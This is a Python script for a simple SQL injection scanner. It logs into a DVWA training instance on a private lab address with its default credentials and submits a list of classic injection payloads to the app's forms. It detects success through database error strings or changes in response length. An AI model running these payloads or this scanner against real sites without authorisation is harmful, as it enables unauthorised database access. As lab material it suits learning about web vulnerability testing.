import re
import urllib.parse as urlparse

import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

from decode_handler import decode_values


class Scanner:
    def __init__(self, url: str, links: list[str], test_payloads: list[str], payload_success: list[str]):
        init()
        self.session = requests.Session()
        self.target_url = url
        self.target_links = links
        self.payloads = set(test_payloads)
        self.answers_payload_success = set(payload_success)

        self.target_forms_sql_injection = []

    def login(self, login_form, data_login):
        self.session.post(login_form, data=data_login)

    def set_security_level(self, url, data_level):
        response = self.session.post(url, data=data_level)
        answer = decode_values(response.content)
        pattern = r"<b>Security Level:</b> (.*?)<br />"
        matches = re.findall(pattern, answer, re.DOTALL)
        return matches

    def extract_forms(self, url: str):
        """This function is used to extract all the forms from a webpage specified by the input URL."""
        response = self.session.get(url)
        parsed_html = BeautifulSoup(response.content, features='lxml')  # features='html.parser' features='lxml'
        return parsed_html.findAll("form")

    def submit_form(self, form, value: dict | str, url: str):
        """
        Extract all required attributes from forms. Fill out and submit the form
        :param form: Specify the form you want to submit
        :param value: The value we want to set for the inputs in this form
        :param url: Url address of the page from which we retrieved this form
        :return:
        """

        action = form.get("action")
        post_url = urlparse.urljoin(url, action)
        method = form.get("method")

        inputs_list = form.findAll("input")

        post_data = {}
        for input in inputs_list:
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value")
            if input_type == "text":
                input_value = value

            post_data[input_name] = input_value

        if method == 'post':
            return self.session.post(post_url, data=post_data)
        return self.session.get(post_url, params=post_data)

    def run_scanner(self):
        """Check each link in the target_links list, extract forms from those links.
         Check forms and links for vulnerabilities"""
        for link in self.target_links:
            forms = self.extract_forms(link)

            for form in forms:
                """Add and call a method if a FORM vulnerability is found"""
                print(f"[+] Testing form in: {link}")

                is_vulnerable_to = self.test_sql_injection_in_form(form=form, url=link)

                if is_vulnerable_to:
                    self.target_forms_sql_injection.append((link, form))
                    print(f"\n{Fore.CYAN}[***] 💉 Discovered in: {link}{Style.RESET_ALL}\n")
                    print(f"{Fore.YELLOW}[***] 💉 Payload: \n\"{is_vulnerable_to}\"{Style.RESET_ALL}\n")
                    print(f"{Fore.GREEN}Form: {Style.RESET_ALL} \n{form}")
                    print("=" * 50)

    def test_sql_injection_in_form(self, form, url: str):
        """This method is used to check SQL injection vulnerabilities in forms"""
        results = []

        normal_response = self.submit_form(form=form, value="normal value", url=url)

        for payload in self.payloads:
            response = self.submit_form(form=form, value=payload, url=url)
            if self.is_sql_injection_successful(self, response, normal_response):
                results.append((True, payload))
            else:
                results.append((False, payload))
        return [result for result in results if result[0]]

    @staticmethod
    def is_sql_injection_successful(self, response, normal_response):
        """List of error messages that might indicate a successful SQL injection"""
        for error_message in self.answers_payload_success:
            if error_message in response.text:
                return True

        if len(response.text) != len(normal_response.text):
            print(f"{len(response.text)} != {len(normal_response.text)}:")
            return True

        return False


if __name__ == '__main__':
    target_url = "http://10.0.2.12/dvwa/"
    login_url = f"{target_url}/login.php"
    security_url = f"{target_url}/security.php"

    target_links = [
        # "http://10.0.2.12/dvwa/vulnerabilities/sqli/",
        "http://10.0.2.12/dvwa/vulnerabilities/sqli_blind/",
    ]
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' /*",
        "admin' OR '1'='1",
        "admin' OR '1'='1' --",
        "admin' OR '1'='1' /*",
        "admin' AND '1'='1",
        "admin' AND '1'='1' --",
        "admin' AND '1'='1' /*",
        "admin' AND '1'='2",
        "admin' AND '1'='2' --",
        "admin' AND '1'='2' /*",
        "admin' AND '2'='2",
        "admin' AND '2'='2' --",
        "admin' AND '2'='2' /*",
        "admin' AND '3'='2",
        "admin' AND '3'='2' --",
        "admin' AND '3'='2' /*",
        "admin' AND '4'='2",
        "admin' AND '4'='2' --",
        "admin' AND '4'='2' /*",
        "admin' AND '5'='2",
        "admin' AND '5'='2' --",
        "admin' AND '5'='2' /*",
    ]

    answers_payload_success = [
        "You have an error in your SQL syntax;",
        "Warning: mysql_fetch_array() expects parameter 1 to be resource",
        "Warning: mysql_fetch_assoc() expects parameter 1 to be resource",
        "Warning: mysql_num_rows() expects parameter 1 to be resource",
        "Warning: mysql_result() expects parameter 1 to be resource",
        "Warning: pg_exec() [function.pg-exec]: Query failed:",
        "Warning: require() [function.require]: Failed opening required",
        "Warning: include() [function.include]: Failed opening",
        "Microsoft OLE DB Provider for ODBC Drivers error",
        "Microsoft OLE DB Provider for SQL Server error",
        "ODBC Microsoft Access Driver error",
        "ODBC SQL Server Driver error",
        "OLE DB Provider for ODBC",
        "Unclosed quotation mark after the character string",
        "SQL command not properly ended",
        "Query failed to execute",
        "Query failed to execute due to invalid syntax",
        "Error in SQL syntax",
        "Invalid SQL syntax",
        "SQL syntax error",
        "SQL error",
        "Database error",
        "Query error",
    ]

    authorization_in_login_form = {
        "username": 'admin',
        "password": 'password',
        "Login": 'submit',
    }

    data_security = {
        'security': 'medium',
        'seclev_submit': 'Submit'
    }

    vulnerability_scanner = Scanner(target_url, target_links, payloads, answers_payload_success)
    vulnerability_scanner.login(login_url, authorization_in_login_form)

    security_level = vulnerability_scanner.set_security_level(security_url, data_security)
    print(f"\n[+] Security Level: {security_level[0]} \n")

    print("\033[1;32m\nVulnerability Scanner Starts 🧐 ==> \033[0m")
    vulnerability_scanner.run_scanner()
